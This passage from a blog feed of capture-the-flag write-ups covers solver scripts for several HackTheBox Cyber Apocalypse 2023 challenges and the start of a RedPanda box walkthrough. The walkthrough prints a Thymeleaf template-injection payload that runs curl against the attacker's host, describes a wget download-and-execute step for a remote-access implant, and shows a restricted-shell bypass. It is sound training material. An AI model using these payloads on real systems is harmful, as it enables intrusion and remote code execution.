37
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#--------------------------------------------------
# Hunting License - Cyber Apocalypse 2023 solution.
#                                   Author: 4g3nt47
#--------------------------------------------------
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="s">""</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s">"477b7a6177527d77557a7d727f323232"</span><span class="p">)</span>
<span class="n">decoded</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)):</span>
  <span class="n">decoded</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="mi">19</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">decoded</span><span class="p">)</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"165.232.98.6"</span><span class="p">,</span> <span class="mi">31978</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"elf"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"x86-64"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"libreadline"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"0x401172"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"5"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"PasswordNumeroUno"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"0wTdr0wss4P"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"P4ssw0rdTw0"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"19"</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">decoded</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"}`"</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<hr />
<p><br /></p>

<h3 id="misc">Misc</h3>
<p><br /></p>

<h4 id="persistence">Persistence</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>very easy</em></li>
</ul>

<blockquote>
  <p>Thousands of years ago, sending a GET request to <strong>/flag</strong> would grant immense power and wisdom. Now it’s broken and usually returns random data, but keep trying, and you might get lucky… Legends say it works once every 1000 tries.</p>
</blockquote>

<p>From the above description, it’s clear that this is a bruteforce challenge. So I wrote a script to deal with it;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#----------------------------------------------
# Persistence - Cyber Apocalypse 2023 solution.
#                               Author: 4g3nt47
#----------------------------------------------
</span>
<span class="kn">import</span> <span class="nn">requests</span><span class="p">,</span> <span class="n">threading</span><span class="p">,</span> <span class="n">time</span>

<span class="k">def</span> <span class="nf">get_flag</span><span class="p">():</span>
  <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="c1"># print("[*] Trying...")
</span>    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://206.189.112.129:30585/flag"</span><span class="p">).</span><span class="n">text</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">if</span> <span class="s">"HTB"</span> <span class="ow">in</span> <span class="n">r</span><span class="p">:</span>
      <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] Flag: </span><span class="si">{</span><span class="n">r</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
      <span class="k">break</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
  <span class="n">t</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">get_flag</span><span class="p">)</span>
  <span class="n">t</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>[+] Flag: HTB{y0u_h4v3_p0w3rfuL_sCr1pt1ng_ab1lit13S!}
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="restricted">Restricted</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<p><code class="language-plaintext highlighter-rouge">Dockerfile</code> showed a user <code class="language-plaintext highlighter-rouge">restricted</code> created without a password;</p>

<p><img src="/assets/img/20230323153510.png" alt="" /></p>

<p>I was able to login over SSH without password;</p>

<p><img src="/assets/img/20230323153630.png" alt="" /></p>

<p>Can’t run many commands. <code class="language-plaintext highlighter-rouge">PATH</code> is marked read-only, and set to <code class="language-plaintext highlighter-rouge">/home/restricted/.bin</code> as defined in <code class="language-plaintext highlighter-rouge">bash_profile</code> used to setup the user. Can’t also use <code class="language-plaintext highlighter-rouge">/</code> in command names, so can’t supply full paths;</p>

<p><img src="/assets/img/20230323154018.png" alt="" /></p>

<p>Since <code class="language-plaintext highlighter-rouge">.bash_profile</code> is only loaded after a normal shell login, we could bypass this by passing commands to execute as string arguments to the SSH binary. This way, <code class="language-plaintext highlighter-rouge">.bash_profile</code> is never loaded;</p>

<p><img src="/assets/img/20230323154255.png" alt="" /></p>

<p><br /></p>

<h4 id="remote-computation">Remote Computation</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<blockquote>
  <p>The alien species use remote machines for all their computation needs. Pandora managed to hack into one, but broke its functionality in the process. Incoming computation requests need to be calculated and answered rapidly, in order to not alarm the aliens and ultimately pivot to other parts of their network. Not all requests are valid though, and appropriate error messages need to be sent depending on the type of error. Can you buy us some time by correctly responding to the next 500 requests?</p>
</blockquote>

<p>This seems to be a programming exercise. Connecting to the service, there is a help menu that explains all the requirements;</p>

<p><img src="/assets/img/20230323154650.png" alt="" /></p>

<p>Knowing this, I wrote a script to automate this;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-----------------------------------------------------
# Remote Computation - Cyber Apocalypse 2023 solution.
#                                      Author: 4g3nt47
#-----------------------------------------------------
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"139.59.176.230"</span><span class="p">,</span> <span class="mi">30021</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
    <span class="n">query</span> <span class="o">=</span> <span class="n">query</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"]: "</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">" = "</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[</span><span class="si">{</span><span class="n">count</span><span class="si">}</span><span class="s">] query: </span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">ans</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">try</span><span class="p">:</span>
      <span class="n">ans</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">query</span><span class="p">)</span> <span class="c1"># Wr1t1ng s4f3 c0d3 1s my p45510n :)
</span>      <span class="k">if</span> <span class="n">ans</span> <span class="o">&lt;</span> <span class="o">-</span><span class="mi">1337</span> <span class="ow">or</span> <span class="n">ans</span> <span class="o">&gt;</span> <span class="mi">1337</span><span class="p">:</span>
        <span class="n">ans</span> <span class="o">=</span> <span class="s">"MEM_ERR"</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="n">ans</span> <span class="o">=</span> <span class="s">"%.2f"</span> <span class="o">%</span><span class="p">(</span><span class="n">ans</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">ZeroDivisionError</span><span class="p">:</span>
      <span class="n">ans</span> <span class="o">=</span> <span class="s">"DIV0_ERR"</span>
    <span class="k">except</span> <span class="nb">SyntaxError</span><span class="p">:</span>
      <span class="n">ans</span> <span class="o">=</span> <span class="s">"SYNTAX_ERR"</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"[+] </span><span class="si">{</span><span class="n">ans</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">ans</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
  <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
    <span class="k">break</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>HTB{d1v1d3_bY_Z3r0_3rr0r}
</pre></td></tr></tbody></table></code></pre></div></div>

<p><br /></p>

<h4 id="janken">Janken</h4>
<p><br /></p>

<ul>
  <li>Difficulty: <em>easy</em></li>
</ul>

<blockquote>
  <p>As you approach an ancient tomb, you’re met with a wise guru who guards its entrance. In order to proceed, he challenges you to a game of Janken, a variation of rock paper scissors with a unique twist. But there’s a catch: you must win 100 rounds in a row to pass. Fail to do so, and you’ll be denied entry.</p>
</blockquote>

<p><img src="/assets/img/20230323155229.png" alt="" /></p>

<p>After a bit of reversing, the function <code class="language-plaintext highlighter-rouge">game()</code> was found to be responsible for playing a round and deciding the winner. It uses the standard C function <code class="language-plaintext highlighter-rouge">strstr()</code> to check if the choice made by computer (the <em>needle</em>), which can be <code class="language-plaintext highlighter-rouge">rock</code>, <code class="language-plaintext highlighter-rouge">paper</code>, or <code class="language-plaintext highlighter-rouge">scissors</code>, matches that made by user (the <em>haystack</em>). If it does, user wins.</p>

<p>Since <code class="language-plaintext highlighter-rouge">strstr()</code> scans the whole haystack for a match independent of position, and the program does not implement any length validation during the check, a user can simply enter the combination of all three possible choices (<code class="language-plaintext highlighter-rouge">rock</code> + <code class="language-plaintext highlighter-rouge">paper</code> + <code class="language-plaintext highlighter-rouge">scissors</code>), which will always make <code class="language-plaintext highlighter-rouge">strstr()</code> to return non-zero, giving user the win. I automated this in a simple script;</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python3
#-----------------------------------------
# Janken - Cyber Apocalypse 2023 solution.
#                          Author: 4g3nt47
#-----------------------------------------
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"161.35.168.118"</span><span class="p">,</span> <span class="mi">30716</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="n">count</span> <span class="o">&lt;</span> <span class="mi">99</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">readuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"&gt;&gt; "</span><span class="p">).</span><span class="n">decode</span><span class="p">())</span>
  <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">"rockpaperscissors"</span><span class="p">)</span>
  <span class="n">count</span> <span class="o">+=</span> <span class="mi">1</span>
<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>[+] You are worthy! Here is your prize: HTB{r0ck_p4p3R_5tr5tr_l0g1c_buG}
</pre></td></tr></tbody></table></code></pre></div></div>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="web" /><category term="linux" /><category term="windows" /><category term="jeopardy" /><category term="ctf" /><category term="forensics" /><category term="web" /><category term="misc" /><category term="reversing" /><category term="competiton" /><summary type="html"><![CDATA[Cyber Apocalypse 2023 is a very nice jeopardy-style CTF competition hosted by HackTheBox. It was a 5-day CTF played between 19th - 23rd March, 2023. This is a write-up on some of the challenges that I managed to solve during the competition.]]></summary></entry><entry><title type="html">RedPanda - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/redpanda.html" rel="alternate" type="text/html" title="RedPanda - HackTheBox" /><published>2022-11-26T00:00:00+01:00</published><updated>2022-11-26T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/redpanda</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/redpanda.html"><![CDATA[<p><strong>RedPanda</strong> is a very easy linux box. It starts with a web service that’s vulnerable to <em>Server-side Template Injection (SSTI)</em> using <em>Thymeleaf</em> to gain <em>RCE</em>. Privesc involves exploiting two (2) path <em>path traversal</em> vulnerabilites, and an <em>XXE injection</em> to read SSH key of root.</p>

<p><br /></p>

<h3 id="about">About</h3>
<p><br /></p>

<p><img src="/assets/img/20221126120935.png" alt="" /></p>

<p><img src="/assets/img/20221126121026.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="recon">Recon</h3>
<p><br /></p>

<h4 id="nmap">NMAP</h4>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Wed Aug 17 08:06:18 2022 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.170
Nmap scan report for 10.10.11.170
Host is up (0.35s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http-proxy
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Wed, 17 Aug 2022 07:06:59 GMT
|     Connection: close
|     &lt;!DOCTYPE html&gt;
---[snip]---
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Red Panda Search | Made with Spring Boot
1 service unrecognized despite returning data. If you know the service/version, please submit 
---[snip]---
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 17 08:07:45 2022 -- 1 IP address (1 host up) scanned in 86.84 seconds
</pre></td></tr></tbody></table></code></pre></div></div>
<p><br /></p>

<h4 id="web">Web</h4>

<p>There is a web server running on port <strong>8080</strong>;</p>

<p><img src="/assets/img/20221126100241.png" alt="" /></p>

<p>The search bar seems to be working;</p>

<p><img src="/assets/img/20221126100645.png" alt="" /></p>

<p>Testing for SQL injection and XSS didn’t yield anything. Testing for <em>SSTI</em> however gave an interesting result;</p>

<p><img src="/assets/img/20221126100823.png" alt="" /></p>

<p>So I started looking up different <em>SSTI</em> payloads, and <a href="https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/">this article</a> was very helpful. I was able to get blind RCE using;</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="o">*{</span><span class="no">T</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="err">'</span><span class="n">curl</span> <span class="nl">http:</span><span class="c1">//10.10.16.13/pwned')}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p><img src="/assets/img/20221126101414.png" alt="" /></p>

<p>Attempts to directly run a BASH reverse shell one-liner kept failing. But the box has <code class="language-plaintext highlighter-rouge">wget</code>, and I was able to use it to download and execute <a href="https://github.com/4g3nt47/Striker">Striker</a>, which gave me a session on the box as the user <strong>woodenk</strong>;</p>

<p><img src="/assets/img/20221126105758.png" alt="" /></p>

<p><img src="/assets/img/20221126105921.png" alt="" /></p>

<p>I was able to read the user flag in the user’s home directory (Note: most of these files are not supposed to be there. Another player is polluting the home dir with files and spoilers)</p>

<p><img src="/assets/img/20221126110151.png" alt="" /></p>

<p><br /></p>

<hr />
<h3 id="privesc">PrivEsc</h3>
<p><br /></p>

<p>The user <strong>woodenk</strong> belongs to a group called <code class="language-plaintext highlighter-rouge">logs</code>. Running <code class="language-plaintext highlighter-rouge">pspy</code> on the box caught something interesting;</p>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>2022/08/17 13:04:01 CMD: UID=0    PID=1707   | /usr/sbin/CRON -f
2022/08/17 13:04:01 CMD: UID=0    PID=1709   | /bin/sh /root/run_credits.sh
2022/08/17 13:04:01 CMD: UID=0    PID=1708   | /bin/sh -c /root/run_credits
2022/08/17 13:04:01 CMD: UID=0    PID=1710   | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
</pre></td></tr></tbody></table></code></pre></div></div>

<p>I found the Java source of the above program at <code class="language-plaintext highlighter-rouge">/opt/credit-score/LogParser/final/src/main/java/com/logparser/App.java</code></p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
</pre></td><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">com.logparser</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.BufferedWriter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileWriter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.drew.imaging.jpeg.JpegMetadataReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.imaging.jpeg.JpegProcessingException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.metadata.Directory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.metadata.Metadata</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.drew.metadata.Tag</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.jdom2.JDOMException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.input.SAXBuilder</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.output.Format</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.output.XMLOutputter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.jdom2.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">App</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">Map</span> <span class="nf">parseLog</span><span class="o">(</span><span class="nc">String</span> <span class="n">line</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">String</span><span class="o">[]</span> <span class="n">strings</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="na">split</span><span class="o">(</span><span class="s">"\\|\\|"</span><span class="o">);</span>
        <span class="nc">Map</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"status_code"</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">parseInt</span><span class="o">(</span><span class="n">strings</span><span class="o">[</span><span class="mi">0</span><span class="o">]));</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"ip"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">1</span><span class="o">]);</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"user_agent"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">2</span><span class="o">]);</span>
        <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"uri"</span><span class="o">,</span> <span class="n">strings</span><span class="o">[</span><span class="mi">3</span><span class="o">]);</span>
        <span class="k">return</span> <span class="n">map</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">isImage</span><span class="o">(</span><span class="nc">String</span> <span class="n">filename</span><span class="o">){</span>
        <span class="k">if</span><span class="o">(</span><span class="n">filename</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="s">".jpg"</span><span class="o">))</span>
        <span class="o">{</span>
            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="nc">String</span> <span class="nf">getArtist</span><span class="o">(</span><span class="nc">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span><span class="o">,</span> <span class="nc">JpegProcessingException</span>
    <span class="o">{</span>
        <span class="nc">String</span> <span class="n">fullpath</span> <span class="o">=</span> <span class="s">"/opt/panda_search/src/main/resources/static"</span> <span class="o">+</span> <span class="n">uri</span><span class="o">;</span>
        <span class="nc">File</span> <span class="n">jpgFile</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">File</span><span class="o">(</span><span class="n">fullpath</span><span class="o">);</span>
        <span class="nc">Metadata</span> <span class="n">metadata</span> <span class="o">=</span> <span class="nc">JpegMetadataReader</span><span class="o">.</span><span class="na">readMetadata</span><span class="o">(</span><span class="n">jpgFile</span><span class="o">);</span>
        <span class="k">for</span><span class="o">(</span><span class="nc">Directory</span> <span class="n">dir</span> <span class="o">:</span> <span class="n">metadata</span><span class="o">.</span><span class="na">getDirectories</span><span class="o">())</span>
        <span class="o">{</span>
            <span class="k">for</span><span class="o">(</span><span class="nc">Tag</span> <span class="n">tag</span> <span class="o">:</span> <span class="n">dir</span><span class="o">.</span><span class="na">getTags</span><span class="o">())</span>
            <span class="o">{</span>
                <span class="k">if</span><span class="o">(</span><span class="n">tag</span><span class="o">.</span><span class="na">getTagName</span><span class="o">()</span> <span class="o">==</span> <span class="s">"Artist"</span><span class="o">)</span>
                <span class="o">{</span>
                    <span class="k">return</span> <span class="n">tag</span><span class="o">.</span><span class="na">getDescription</span><span class="o">();</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="k">return</span> <span class="s">"N/A"</span><span class="o">;</span>
    <span class="o">}</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">addViewTo</span><span class="o">(</span><span class="nc">String</span> <span class="n">path</span><span class="o">,</span> <span class="nc">String</span> <span class="n">uri</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">JDOMException</span><span class="o">,</span> <span class="nc">IOException</span>
    <span class="o">{</span>
